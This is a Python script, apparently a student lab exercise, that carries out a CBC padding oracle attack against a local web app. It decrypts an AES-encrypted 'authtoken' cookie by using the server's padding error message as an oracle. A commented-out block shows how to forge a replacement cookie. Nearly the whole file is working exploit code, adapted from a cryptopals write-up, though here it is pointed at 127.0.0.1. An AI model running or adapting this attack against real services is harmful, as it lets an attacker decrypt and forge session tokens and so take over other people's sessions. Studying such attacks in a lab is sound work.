#!/usr/bin/env python3



# CBC padding oracle attack
# - lenerd

import requests
import sys
from base64 import b64decode
from Crypto.Cipher import AES
import os
import random
from Crypto.Util.Padding import pad, unpad


BLOCK_SIZE = 16

#implementation from https://research.nccgroup.com/2021/02/17/cryptopals-exploiting-cbc-padding-oracles/
def single_block_attack(block, oracle):
    """Returns the decryption of the given ciphertext block"""

    # zeroing_iv starts out nulled. each iteration of the main loop will add
    # one byte to it, working from right to left, until it is fully populated,
    # at which point it contains the result of DEC(ct_block)
    zeroing_iv = [0] * BLOCK_SIZE

    for pad_val in range(1, BLOCK_SIZE+1):
        padding_iv = [pad_val ^ b for b in zeroing_iv]

        for candidate in range(256):
            padding_iv[-pad_val] = candidate
            iv = bytes(padding_iv)
            if oracle(iv, block):
                if pad_val == 1:
                    # make sure the padding really is of length 1 by changing
                    # the penultimate block and querying the oracle again
                    padding_iv[-2] ^= 1
                    iv = bytes(padding_iv)
                    if not oracle(iv, block):
                        continue  # false positive; keep searching
                break
        else:
            raise Exception("no valid padding byte found (is the oracle working correctly?)")

        zeroing_iv[-pad_val] = candidate ^ pad_val

    return zeroing_iv

#implementation from https://research.nccgroup.com/2021/02/17/cryptopals-exploiting-cbc-padding-oracles/
def full_attack(iv, ct, oracle):
    """Given the iv, ciphertext, and a padding oracle, finds and returns the plaintext"""
    assert len(iv) == BLOCK_SIZE and len(ct) % BLOCK_SIZE == 0

    msg = iv + ct
    blocks = [msg[i:i+BLOCK_SIZE] for i in range(0, len(msg), BLOCK_SIZE)]
    result = b''

    # loop over pairs of consecutive blocks performing CBC decryption on them
    iv = blocks[0]
    for ct in blocks[1:]:
        dec = single_block_attack(ct, oracle)
        pt = bytes(iv_byte ^ dec_byte for iv_byte, dec_byte in zip(iv, dec))
        result += pt
        iv = ct

    return result


def check_padding(iv, ct):

    #this does not work
    res = requests.get(f'{"http://127.0.0.1:5000"}/quote/', cookies={'authtoken': (iv + ct).hex()})
    if res.text == "PKCS#7 padding is incorrect.": 
        return False 
    else:
        return True
        print(res.text)
"""
    #Lokale run decryption was for testing that all the other code worked and it does give the decrypted message
    #this works
    #key = b'\xdak5\xe8\x06\xd1\x9ctchX\xd9\x93\xa2\xa8C'
    cipher = AES.new(key, AES.MODE_CBC, iv)
    pt = cipher.decrypt(ct)
    try:
        unpad(pt, AES.block_size)
    except ValueError:  # raised by unpad() if padding is invalid
        return False
    return True
"""



def attack(base_url):
    
    #The requests for getting the cookie
    res = requests.get(f'{"http://127.0.0.1:5000"}/quote/')
    #extraticn the cipertext from the requests result from the cookie
    cipertext = res.cookies.get("authtoken")
    
    #Changing the cipertext to hex from 
    cipertext = bytes.fromhex(cipertext)
 
    #splitting the cipertext into the iv and the actuel text
    iv = cipertext[:16]
    cipertext = cipertext[16:]
    
    #run the attack code from above
    result = full_attack(iv, cipertext, check_padding)
    #should unpad the result from the above into the plaintext of the cookie
    plaintext = unpad(result, 16)
    print("Recovered plaintext:", plaintext)

"""
    start = plaintext.find(b'"') + 1
    end = plaintext.find(b'"', start)
    substring = plaintext[start:end]
    secret = substring + b' plain CBC is not secure!'

    aes = AES.new(key, AES.MODE_CBC, iv=iv)
    plaintext = pad(secret, 16)
    cokie = iv + aes.encrypt(plaintext)

    print()
    res = requests.get(f'{base_url}/quote/', cookies={'authtoken': cokie.hex()})
    print(f'[+] done:\n{res.text}')
"""
    #find_plaintext(cipertext)
    #print(f'[+] done:\n{cipertext}')
    



if __name__ == '__main__':
    if len(sys.argv) != 2:
        print(f'usage: {sys.argv[0]} <base url>', file=sys.stderr)
        exit(1)
    attack(sys.argv[1])
